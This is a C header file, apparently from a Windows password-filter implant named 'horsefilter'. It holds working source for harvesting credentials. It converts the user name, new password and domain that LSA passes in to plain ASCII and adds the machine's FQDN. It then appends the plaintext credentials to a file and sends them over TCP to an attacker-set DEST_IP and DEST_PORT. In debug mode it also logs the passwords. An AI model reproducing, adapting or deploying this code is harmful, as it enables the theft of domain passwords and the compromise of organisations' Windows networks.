#ifndef _HORSEFILTER_H
#define _HORSEFILTER_H

#include "macros.h"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <ntsecapi.h>
#include <npapi.h>
#include <stdio.h>
#include <time.h>

// simple logging function with timestamp
// only runs if DEBUG macro is set
void Log(PSTR format, ...)
{
	if (!DEBUG) return;
	
	time_t now;
    struct tm *tm_info;
    time(&now);
    tm_info = localtime(&now);
    char strtime[32];
    strftime(strtime, sizeof(strtime), "%H:%M:%S", tm_info);

	FILE *f = fopen(LOG_FILE, "a");
	if (f == NULL) return;

	fprintf(f, "[%s] ", strtime);

	va_list args;
	va_start(args, format);
	vfprintf(f, format, args);
	va_end(args);

	fclose(f);
}

// gets fqdn of local machine
// if any step fails it copies "NULL" into buffer
void GetFQDN(PSTR buffer, size_t bufferSize)
{
	Log("entering GetFQDN\n");

	// init winsock
	WSADATA wsaData;
	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0) 
	{
		Log("WSAStartup failed with error code %d\n", result);
		strncpy(buffer, "NULL", bufferSize);
		return;
	}

	// get hostname
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0)
    {
        Log("gethostname failed: %d\n", WSAGetLastError());
        strncpy(buffer, "NULL", bufferSize);
        return;
    }

	// ask for canonical name
    struct addrinfo hints, *info, *p;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_CANONNAME;

    if (getaddrinfo(hostname, NULL, &hints, &info) != 0)
    {
        Log("getaddrinfo failed: %d\n", WSAGetLastError());
        strncpy(buffer, "NULL", bufferSize);
        return;
    }

	// find it in results
    for (p = info; p != NULL; p = p->ai_next)
    {
        if (p->ai_canonname)
        {
            strncpy(buffer, p->ai_canonname, bufferSize);
            break;
        }
    }

    if (p == NULL)
    {
        Log("no canonical name found\n");
        strncpy(buffer, "NULL", bufferSize);
    }

    freeaddrinfo(info);
	WSACleanup();
    Log("exiting GetFQDN\n");
}

// copies unicode string to ascii string
// returns "NULL" if unicode is null or empty
// and always outputs a null-terminated string into buffer
// this is so complicated because lsa string handling is fucked
void UnicodeToASCII(PSTR buffer, PUNICODE_STRING unicode, size_t bufferSize)
{
	// check if unicode is NULL or empty
	Log("entering UnicodeToASCII\n");
	if (unicode == NULL || unicode->Length == 0)
	{
		if (unicode == NULL)
			Log("unicode is null\n");
		else
			Log("unicode length is 0\n");

		strncpy(buffer, "NULL", bufferSize);
		return;
	}
	
	Log("unicode->Length = %d\n", unicode->Length);
	Log("unicode->MaximumLength = %d\n", unicode->MaximumLength);

	// loop through unicode string and convert to ascii
	// stop at null terminator or either buffer size
	int i;
	for (i = 0; i < (unicode->Length/2) && i < bufferSize; i++)
	{
		if (unicode->Buffer[i] == L'\0')
			break;
			
		wctomb(&buffer[i], unicode->Buffer[i]);
		Log("\t         buffer[%d] = %c\n", i, buffer[i]);
		Log("\tunicode->Buffer[%d] = %lc\n", i, unicode->Buffer[i]);
	}

	// null-terminate buffer
	int null;
	if (i < bufferSize)
		null = i;
	else
		null = bufferSize - 1;

	buffer[null] = '\0';
	Log("\t         buffer[%d] = '\\0'\n", null);

	Log("buffer = %s\n", buffer);
	Log("exiting UnicodeToASCII\n");
}

// sends string over tcp to destination specified in macros
void SendBytes(PSTR buffer)
{
	// init winsock
	WSADATA wsaData;
	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0) 
	{
		Log("WSAStartup failed with error code %d\n", result);
		return;
	}

	// set up socket
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET)
	{
		Log("socket failed with error code %d\n", WSAGetLastError());
		return;
	}
	Log("socket = %p\n", s);
	
	// set up destination
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(DEST_IP);
	server.sin_port = htons(DEST_PORT);
	
	// connect to server
	int sockfd = connect(s, (PSOCKADDR)&server, sizeof(server));
	if (sockfd == SOCKET_ERROR)
	{
		Log("connect failed with error code %d\n", WSAGetLastError());
		return;
	}
	Log("connected to %s:%d\n", DEST_IP, DEST_PORT);

	// send buffer
	int bytes = send(s, buffer, sizeof(char)*strlen(buffer), 0);
	if (bytes == SOCKET_ERROR)
	{
		Log("send failed with error code %d\n", WSAGetLastError());
		return;
	}
	Log("sent %d bytes\n", bytes);
	
	// close socket
	shutdown(s, SD_BOTH);
	WSACleanup();
}

// writes credentials to file
void WriteCreds(
	PUNICODE_STRING UserName, 
	PUNICODE_STRING NewPassword, 
	PUNICODE_STRING Domain, 
	PSTR extra)
{
	if (!WRITE_CREDS) return;
	
	Log("entering WriteCreds\n");
	FILE *f = fopen(CREDS_FILE, "a");
	if (f == NULL) return;

	char username[256];
	char password[256];
	char domain[256];
	char fqdn[256];

	UnicodeToASCII(username, UserName, sizeof(username));
	UnicodeToASCII(password, NewPassword, sizeof(username));
	UnicodeToASCII(domain, Domain, sizeof(username));

	GetFQDN(fqdn, sizeof(fqdn)); 

	if (extra == NULL || extra[0] == '\0')
	{
		if (extra == NULL)
			Log("extra is null\n");
		else
			Log("extra is empty\n");

		extra = "NULL";
	}

	Log("fqdn = %s\n", fqdn);
	Log("domain = %s\n", domain);
	Log("username = %s\n", username);
	Log("password = %s\n", password);
	Log("extra = %s\n", extra);

	fprintf(f, "'%s' '%s' '%s' '%s' '%s'\n", fqdn, domain, username, password, extra);
	fclose(f);

	Log("exiting WriteCreds\n");
}

// sends credentials over tcp
void SendCreds(
	PUNICODE_STRING UserName, 
	PUNICODE_STRING NewPassword, 
	PUNICODE_STRING Domain, 
	PSTR extra)
{
	if (!SEND_CREDS) return;
	Log("entering SendCreds\n");

	char buffer[2048];
	char username[256];
	char password[256];
	char domain[256];
	char fqdn[256];
	
	UnicodeToASCII(username, UserName, sizeof(username));
	UnicodeToASCII(password, NewPassword, sizeof(username));
	UnicodeToASCII(domain, Domain, sizeof(username));

	GetFQDN(fqdn, sizeof(fqdn)); 

	if (extra == NULL || extra[0] == '\0')
	{
		extra = "NULL";
	}

	Log("fqdn = %s\n", fqdn);
	Log("domain = %s\n", domain);
	Log("username = %s\n", username);
	Log("password = %s\n", password);
	Log("extra = %s\n", extra);

	// place all info into one buffer
	snprintf(buffer, sizeof(buffer), "%s\r\n%s\r\n%s\r\n%s\r\n%s", fqdn, domain, username, password, extra);
	Log("buffer for socket = %s\n", buffer);
	
	SendBytes(buffer);

	Log("exiting SendCreds\n");
}

#endif